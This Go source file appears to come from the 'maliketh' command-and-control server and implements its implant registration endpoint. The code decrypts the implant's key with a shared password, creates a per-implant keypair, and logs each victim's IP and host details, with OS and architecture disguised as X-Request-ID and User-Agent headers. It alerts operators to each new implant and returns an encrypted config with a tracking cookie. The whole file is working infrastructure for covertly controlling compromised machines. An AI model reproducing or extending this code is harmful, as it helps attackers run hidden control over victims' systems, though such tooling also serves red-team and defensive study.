package c2

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"strings"

	"github.com/cbrnrd/maliketh/server-go/internal/crypto"
	"github.com/cbrnrd/maliketh/server-go/internal/model"
	"github.com/cbrnrd/maliketh/server-go/internal/server"
	"go.uber.org/zap"
)

type registerRequest struct {
	Txid string `json:"txid"`
}

type registerResponse struct {
	Status bool   `json:"status"`
	K      string `json:"k"`      // Server public key (base64)
	C      string `json:"c"`      // Encrypted config (base64)
}

func (h *Handler) handleRegister() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var req registerRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Txid == "" {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Decrypt the implant public key using the registration password (secretbox)
		implantPubKeyB64, err := h.decryptRegistrationKey(req.Txid)
		if err != nil {
			h.logger.Error("failed to decrypt registration key", zap.Error(err))
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Validate the public key
		if _, err := crypto.DecodePublicKey(implantPubKeyB64); err != nil {
			h.logger.Error("invalid implant public key", zap.Error(err))
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Check if implant is already registered
		existing, _ := h.repos.Implant.GetByPublicKey(r.Context(), implantPubKeyB64)
		if existing != nil {
			h.logger.Warn("implant already registered", zap.String("implant_pk", implantPubKeyB64))
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Generate server keypair for this implant
		serverPrivB64, serverPubB64, err := crypto.GenerateKeyPairB64()
		if err != nil {
			h.logger.Error("failed to generate server keypair", zap.Error(err))
			http.Error(w, "Internal error", http.StatusInternalServerError)
			return
		}

		// Get real IP
		realIP := r.Header.Get("X-Real-IP")
		if realIP == "" {
			realIP = r.RemoteAddr
		}

		// Create implant record
		implant := &model.Implant{
			Hostname:  r.Host,
			IP:        realIP,
			OS:        r.Header.Get("X-Request-ID"), // OS info passed in header
			Arch:      r.Header.Get("User-Agent"),   // Platform info
			ServerSK:  serverPrivB64,
			ImplantPK: implantPubKeyB64,
		}

		createdImplant, err := h.repos.Implant.Create(r.Context(), implant)
		if err != nil {
			h.logger.Error("failed to create implant", zap.Error(err))
			http.Error(w, "Internal error", http.StatusInternalServerError)
			return
		}

		// Create config from profile
		cfg, err := h.repos.Config.CreateFromProfile(r.Context(), createdImplant.ImplantID, serverPubB64, h.profile)
		if err != nil {
			h.logger.Error("failed to create implant config", zap.Error(err))
			// Clean up implant
			h.repos.Implant.Delete(r.Context(), createdImplant.ImplantID)
			http.Error(w, "Internal error", http.StatusInternalServerError)
			return
		}

		h.logger.Info("new implant registered",
			zap.String("implant_id", createdImplant.ImplantID),
			zap.String("ip", realIP))

		// Notify operators
		if h.publisher != nil {
			h.publisher.PublishAnnouncement(r.Context(), "New implant registered: "+createdImplant.ImplantID)
		}

		// Prepare encrypted response
		responseBody := map[string]any{
			"status": true,
			"id":     createdImplant.ImplantID,
			"config": cfg.ToJSON(),
		}

		responseJSON, _ := json.Marshal(responseBody)

		// Encrypt response with implant's public key and server's private key
		encryptedResponse, err := crypto.EncryptB64(implantPubKeyB64, serverPrivB64, responseJSON)
		if err != nil {
			h.logger.Error("failed to encrypt response", zap.Error(err))
			http.Error(w, "Internal error", http.StatusInternalServerError)
			return
		}

		// Set implant ID cookie
		http.SetCookie(w, &http.Cookie{
			Name:     h.profile.Globals.ImplantIDCookie,
			Value:    createdImplant.ImplantID,
			Path:     "/",
			HttpOnly: true,
		})

		server.JSON(w, http.StatusOK, registerResponse{
			Status: true,
			K:      serverPubB64,
			C:      encryptedResponse,
		})
	}
}

func (h *Handler) decryptRegistrationKey(encryptedKey string) (string, error) {
	// The registration password is base64 encoded in the profile
	keyBytes, err := base64.StdEncoding.DecodeString(h.profile.Globals.RegistrationPassword)
	if err != nil {
		return "", err
	}

	var key [32]byte
	copy(key[:], keyBytes)

	// Decrypt using secretbox
	decrypted, err := crypto.SecretBoxDecrypt(&key, encryptedKey)
	if err != nil {
		return "", err
	}

	// Remove null bytes and trim
	result := strings.ReplaceAll(string(decrypted), "\x00", "")
	return strings.TrimSpace(result), nil
}
